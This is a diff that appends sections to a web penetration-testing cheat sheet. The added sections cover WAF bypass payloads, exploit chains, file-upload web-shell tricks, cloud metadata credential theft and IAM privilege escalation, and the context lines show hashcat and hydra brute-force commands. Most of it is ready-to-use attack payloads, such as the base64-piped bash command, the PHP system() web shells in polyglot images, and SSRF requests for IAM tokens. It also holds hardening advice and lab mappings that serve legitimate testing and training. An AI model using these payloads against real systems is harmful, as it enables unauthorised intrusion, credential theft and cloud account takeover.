@@ -1825,4 +1825,397 @@ hashcat -m 1000 hashes.txt ~/wordlists/rockyou.txt -r ~/rules/best64.rule -O
 
 # Hydra brute-force on HTTP form
 hydra -l admin -P ~/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+---
+
+## Part 22: WAF Bypass Techniques
+
+### WAF Detection
+```
+wafw00f https://target.com
+nmap --script http-waf-detect -p 80,443 target.com
+# Manual: send basic XSS payload, observe response
+curl -s "https://target.com/?q=<script>alert(1)</script>" | grep -i "blocked\|forbidden\|waf\|cloudflare\|akamai"
+```
+
+### Common WAFs and Known Weaknesses
+| WAF | Detection Signature | Bypass Weakness |
+|-----|-------------------|-----------------|
+| Cloudflare | cf-ray header, __cfduid cookie | Case variation, encoding tricks, origin IP discovery |
+| AWS WAF | x-amzn-RequestId | HTTP parameter pollution, JSON body bypass |
+| Azure WAF | Azure header patterns | Content-Type manipulation, HTTP/2 |
+| ModSecurity | Specific error messages | Multi-part bypass, encoding layering |
+| Imperva/Incapsula | _incap_ cookie | JSON body, WebSocket upgrade |
+| F5 BIG-IP ASM | TS cookie | Request smuggling, chunked encoding |
+| FortiWeb | Block page patterns | Chunked bypass, parameter placement |
+| Sucuri | sucuri_cloudproxy cookie | Direct origin IP access |
+
+### SQL Injection WAF Bypass
+```
+# Case variation: SeLeCt * FrOm users
+# Inline comments: /*!50000SELECT*/ * FROM users
+# Whitespace alternatives: SELECT/**//**/FROM/**/users
+# URL encoding: %53%45%4C%45%43%54
+# Double encoding: %2553%2545%254C%2545%2543%2554
+# Hex (MySQL): 0x73656C656374202A2066726F6D207573657273
+# Concatenation: CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))
+# Parameter pollution: ?id=1&id=1' UNION SELECT 1,2,3--
+# JSON body injection (bypasses URL param WAF): {"id": "1' UNION SELECT 1,2,3--"}
+# Chunked transfer encoding: Transfer-Encoding: chunked
+```
+
+### XSS WAF Bypass
+```
+<ScRiPt>alert(1)</ScRiPt>
+<svg/onload=alert(1)>
+<body onpageshow=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe src="jAvAsCrIpT:alert(1)">
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<img src=x onerror="self['alert'](1)">
+# DOM-based bypass (fragment never sent to server)
+# Upload-based bypass (payload in filename)
+```
+
+### Path Traversal WAF Bypass
+```
+../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd (double)
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd (UTF-8 overlong)
+....//....//....//etc/passwd
+..\..\..\windows\win.ini
+/etc/passwd (absolute path)
+```
+
+### Command Injection WAF Bypass
+```
+| id
+%0a id  (newline)
+`id`
+$(id)
+cat${IFS}/etc/passwd  ($IFS instead of space)
+echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
+/bin/c?t /etc/passwd  (wildcard)
+cat</etc/passwd
+```
+
+### General WAF Bypass Strategies
+1. HTTP Method Switching (POST→GET, PUT, PATCH)
+2. Content-Type Manipulation (urlencoded↔JSON↔multipart)
+3. Parameter Pollution (WAF checks first param, backend uses last)
+4. Chunked Transfer Encoding (WAF doesn't reassemble)
+5. HTTP/2 Multiplexing (different frame handling)
+6. Request Smuggling (bypass WAF entirely)
+7. Origin IP Discovery (Shodan, Censys, SSL certs, DNS history)
+8. Encoding Layering (multiple decode stages)
+9. Parameter Placement (move payload: URL→body→header→cookie)
+10. Cloud Metadata Redirection (SSRF to bypass external WAF)
+
+---
+
+## Part 23: Vulnerability Chaining Patterns
+
+### Chain 1: XSS → CSRF → Account Takeover
+Find XSS → read CSRF token from page → send password change request from victim's browser → attacker receives reset email → full account takeover.
+
+### Chain 2: Open Redirect → OAuth Token Theft
+Find open redirect → craft OAuth URL with attacker's domain in redirect_uri → victim authenticates → auth code sent to attacker → token theft.
+
+### Chain 3: LFI → Log Poisoning → RCE
+Find LFI → inject PHP code into access log via User-Agent: `<?php system($_GET['cmd']); ?>` → include contaminated log: `?file=/var/log/apache2/access.log&cmd=id` → RCE.
+
+### Chain 4: LFI → PHP Filter Chain → RCE
+PHP filter chain via `php://filter/convert.iconv.*` character conversions → construct arbitrary PHP code from existing files. Tool: php_filter_chain_generator.py.
+
+### Chain 5: File Upload → LFI → RCE
+Upload web shell (try .php, .pht, .php5, .phtml, .phar, .shtml) → find upload path → include via LFI or direct access.
+
+### Chain 6: SSRF → IMDS → Cloud Account Takeover
+SSRF → cloud metadata endpoint (169.254.169.254) → extract IAM credentials → access S3/RDS → pivot to full cloud compromise.
+
+### Chain 7: SQLi → File Write → Web Shell
+SQL injection with stacked queries → MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO` → write PHP/ASPX shell to webroot → access shell.
+
+### Chain 8: SSRF → Internal Service Exploitation
+SSRF → scan internal network → find Redis/Memcached/Elasticsearch → protocol smuggling via gopher:// → RCE or data access.
+
+### Chain 9: IDOR + Weak Password Reset → Admin Takeover
+IDOR to enumerate user IDs → weak reset token → brute-force/guess admin reset token → admin account takeover.
+
+### Chain 10: Subdomain Takeover → Phishing → Credential Harvest
+Dangling CNAME → claim cloud resource (GitHub Pages/S3/Azure) → host phishing page on legitimate subdomain → harvest credentials.
+
+### Chain 11: Race Condition → Multi-Coupon Redemption
+HTTP/2 single-packet attack → 20+ simultaneous coupon redemptions → server applies before marking used → massive discount.
+
+### Chain 12: Host Header Injection → Password Reset Poisoning
+Modify Host header in password reset request → reset link sent with attacker's domain → victim clicks → attacker captures token.
+
+---
+
+## Part 24: File Upload Testing Deep Dive
+
+### Extension Blacklist Bypass
+```
+# PHP variants to try:
+.php   .php5   .phtml   .pht   .phar   .phps   .php7   .php8
+.pHp   .PHP   (case bypass)
+.php.   .php .   (trailing dot/space)
+.php::$DATA   (NTFS alternate data stream)
+.php%00.jpg   (null byte, legacy)
+.php.jpg   (double extension — depends on parser order)
+.asp;.jpg   (IIS semicolon parsing)
+```
+
+### Content-Type/MIME Bypass
+```
+# Change Content-Type header:
+Content-Type: image/jpeg  →  Content-Type: application/x-php
+Content-Type: image/png   →  Content-Type: text/plain
+
+# Some servers only check extension, not Content-Type
+# Others check magic bytes
+```
+
+### Magic Byte Bypass (Polyglot Files)
+```
+# Valid image + PHP code (GIF example):
+GIF89a<?php system($_GET['cmd']); ?>
+
+# PNG:
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+
+# JPEG (keep valid header):
+\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>
+
+# Create polyglot with exiftool:
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+# Or manual:
+echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+### Server-Specific Parsing Tricks
+```
+# Apache .htaccess override:
+Upload .htaccess file with: AddType application/x-httpd-php .jpg
+Then upload shell.jpg → executed as PHP
+
+# IIS 6.0: ;.asp parsing
+shell.asp;.jpg → executed as .asp
+# IIS 7.5+: double extension if handler mapped
+# Nginx: misconfigured fastcgi_pass + file.jpg/php
+
+# Apache mod_cgi: .cgi, .pl execution
+```
+
+### Content-Disposition & multipart Boundary Tricks
+```
+# No filename:
+Content-Disposition: form-data; name="file"
+
+# Multiple files in one field:
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Disposition: form-data; name="file"; filename="shell.jpg"
+
+# Path traversal in filename:
+filename="../../shell.php"
+filename="..\..\shell.aspx"
+```
+
+### SVG-Based Attacks
+```xml
+<!-- Stored XSS via SVG upload -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
+
+<!-- XXE via SVG -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <text>&xxe;</text>
+</svg>
+
+<!-- Server-side request via SVG -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://169.254.169.254/latest/meta-data/"/>
+</svg>
+```
+
+### Post-Upload Exploitation
+1. **Extension bypass**: Try all PHP/ASP/JSP variants
+2. **Double write race condition**: Write + read before extension check completes
+3. **Archive extraction**: Upload .zip → extract reveals .php inside
+4. **Image processing library exploitation**: ImageTragick (CVE-2016-3714)
+5. **Path traversal in upload path**: Overwrite .htaccess or existing files
+6. **ZIP slip**: Path traversal inside .zip filenames during extraction
+7. **XML-based file parsing**: Upload .docx/.xlsx with XXE payloads
+
+---
+
+## Part 25: PortSwigger Web Security Academy Lab Mapping
+
+Map WSTG tests to hands-on labs for practice:
+
+| WSTG Category | PortSwigger Lab Topics |
+|---------------|----------------------|
+| **SQL Injection (INPV-05)** | SQL injection (all types), Blind SQL injection |
+| **XSS (INPV-01/02)** | Reflected XSS, Stored XSS, DOM XSS |
+| **CSRF (SESS-05)** | CSRF where token validation depends on request method/token presence |
+| **Clickjacking (CLNT-09)** | Basic clickjacking, pre-populated form, frame buster bypass |
+| **DOM-based (CLNT-01)** | DOM XSS in various sinks, DOM clobbering |
+| **CORS (CLNT-07)** | CORS with trusted null origin, insecure protocols |
+| **XXE (INPV-07)** | Exploiting XXE using external entities, blind XXE |
+| **SSRF (INPV-19)** | Basic SSRF, SSRF with filter bypass, blind SSRF |
+| **Request Smuggling (INPV-15)** | CL.TE, TE.CL, TE.TE, HTTP/2 downgrade |
+| **Command Injection (INPV-12)** | OS command injection, blind command injection |
+| **SSTI (INPV-18)** | Basic SSTI, SSTI with sandbox escape, blind SSTI |
+| **Path Traversal (ATHZ-01)** | File path traversal, traversal with absolute path bypass |
+| **Access Control (ATHZ-02/03/04)** | Unprotected admin, IDOR, multi-step access control |
+| **Authentication (ATHN-01~10)** | Password brute-force, MFA bypass, password reset poisoning |
+| **WebSockets (CLNT-10)** | Manipulating WebSocket messages, CSWSH |
+| **Cache Poisoning (Bug Bounty)** | Web cache poisoning, cache deception, cache key flaws |
+| **Deserialization (Modern)** | Insecure deserialization (Java, PHP, Ruby) |
+| **Information Disclosure (ERRH)** | Information disclosure in error messages, debug pages |
+| **Business Logic (BUSL-01~09)** | Excessive trust, flawed enforcement, weak isolation |
+| **Host Header (INPV-17)** | Host header auth bypass, password reset poisoning, routing SSRF |
+| **OAuth (Modern)** | OAuth account hijacking via redirect_uri, state manipulation |
+| **File Upload (BUSL-08/09)** | Remote code execution via web shell, polyglot upload |
+| **JWT (Modern)** | JWT algorithm confusion, kid header path traversal |
+| **Prototype Pollution (Modern)** | Client-side prototype pollution, server-side PP |
+| **Race Conditions (BUSL-04)** | Limit overrun, multi-endpoint race, single-endpoint race |
+| **NoSQL Injection (INPV-05.6)** | NoSQL injection, NoSQL operator injection |
+| **API Testing (APIT-01)** | GraphQL introspection, GraphQL IDOR, batching brute-force |
+| **Cache Deception (Modern)** | Web cache deception via path discrepancy |
+| **LLM Attacks (Modern)** | Exploiting LLM APIs, indirect prompt injection |
+
+---
+
+## Part 26: Cloud Security Attack Chains
+
+### AWS Attack Path
+```
+1. Recon: cloud_enum -k target.com → discover S3 buckets, cloudfront, EC2
+2. S3 Enumeration: s3scanner, aws s3 ls --no-sign-request
+3. S3 Exploitation: aws s3 cp s3://bucket/db_backup.sql ./
+4. SSRF → IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+5. Credential Use: aws sts get-caller-identity --profile stolen
+6. Privilege Escalation: Check IAM policies for *:* (admin), iam:CreateAccessKey, iam:UpdateAssumeRolePolicy
+7. Persistence: Create new IAM user, create access key, assume role
+8. Lateral Movement: enumerate EC2, RDS, Lambda, use SSM to run commands
+
+### AWS Specific SSRF to Metadata
+# IMDSv1 (most common target — no token required)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# IMDSv2 (requires PUT for token, harder to exploit via SSRF)
+# Still possible with advanced SSRF (can set headers)
+TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/
+
+# ECS Task Metadata (containers)
+http://169.254.170.2/v2/metadata/
+http://169.254.170.2/v2/credentials/GUID
+```
+
+### GCP Attack Path
+```
+# Metadata endpoint
+http://metadata.google.internal/computeMetadata/v1/
+# Requires header: Metadata-Flavor: Google
+# Can retrieve via SSRF if headers are controllable
+
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+# Use token with gcloud CLI: gcloud auth activate-service-account --key-file=creds.json
+```
+
+### Azure Attack Path
+```
+# Metadata endpoint
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires header: Metadata: true
+
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Use token to access Azure REST API
+```
+
+### Cloud Storage Enumeration
+```bash
+# AWS S3
+aws s3 ls s3://bucket-name --no-sign-request
+aws s3api get-bucket-acl --bucket bucket-name --no-sign-request
+aws s3api get-bucket-policy --bucket bucket-name --no-sign-request
+
+# GCP Storage
+gsutil ls gs://bucket-name
+curl https://storage.googleapis.com/bucket-name
+
+# Azure Blob
+curl https://storageaccount.blob.core.windows.net/container
+# Check for public anonymous access
+```
+
+### Cloud Privilege Escalation Techniques
+```
+# AWS: Check IAM policies for dangerous permissions
+aws iam list-attached-user-policies --user-name USER
+aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
+
+# Dangerous AWS IAM permissions:
+iam:CreateAccessKey, iam:CreateLoginProfile, iam:UpdateAssumeRolePolicy
+iam:AttachUserPolicy, iam:AttachRolePolicy, iam:PutUserPolicy
+lambda:CreateFunction, lambda:UpdateFunctionCode, lambda:InvokeFunction
+ec2:RunInstances (with privileged instance profile)
+sts:AssumeRole (cross-account)
+
+# Tools: Pacu (AWS exploitation), ScoutSuite/Prowler (auditing)
+```
+
+---
+
+## Part 27: Programming Language Security Patterns
+
+### Language-Specific Vulnerability Cheat Sheet
+
+| Language | Top Web Vulns | Common Unsafe Patterns |
+|----------|---------------|----------------------|
+| **PHP** | LFI/RFI, Type Juggling, Deserialization, File Upload | `include($_GET['file'])`, `unserialize($_COOKIE)`, `==` vs `===` loose comparison |
+| **Java** | Deserialization, XXE, EL Injection, SSTI (FreeMarker/Velocity) | `ObjectInputStream`, `DocumentBuilder` without XXE protection, Spring SpEL injection |
+| **Python** | SSTI (Jinja2/Mako), Pickle Deserialization, Command Injection | `render_template_string(user_input)`, `pickle.loads(data)`, `os.system()` with user input |
+| **Node.js/JS** | Prototype Pollution, SSTI (EJS/Pug/Nunjucks), RCE via eval/child_process | `_.merge()` on user objects, `eval(user_input)`, `child_process.exec()` with string concat |
+| **Ruby** | Deserialization (Marshal/YAML), SSTI (ERB), Command Injection | `Marshal.load()`, `YAML.load()`, `eval()`, backtick execution with user input |
+| **Go** | SSTI (html/template), SQL Injection, Path Traversal | Template injection when using text/template instead of html/template, raw SQL concatenation |
+| **C#/.NET** | Deserialization (BinaryFormatter/JSON.NET), XXE, SQL Injection | `BinaryFormatter.Deserialize()`, `XmlDocument` without safe settings, raw SQL with `+` concat |
+| **Rust** | Path Traversal, Injection (rare due to type system) | Unsafe raw SQL, command execution with user input, path join without canonicalization |
+
+### Language-Specific Security Headers/Configurations
+```
+# PHP
+expose_php = Off
+display_errors = Off (production)
+allow_url_include = Off
+disable_functions = exec,shell_exec,system,passthru,popen,proc_open
+
+# Java/Tomcat
+Server header removal: server=""
+Error page configuration to hide stack traces
+XML parser configuration: disable external entities
+
+# Python
+DEBUG = False (Django/Flask production)
+TEMPLATE_DEBUG = False
+SECURE_SSL_REDIRECT = True (Django)
+SESSION_COOKIE_SECURE = True
+SESSION_COOKIE_HTTPONLY = True
+CSRF_COOKIE_SECURE = True
+
+# Node.js
+helmet() middleware
+express-rate-limit for brute-force protection
+express-mongo-sanitize for NoSQL injection
+```
+
 ```
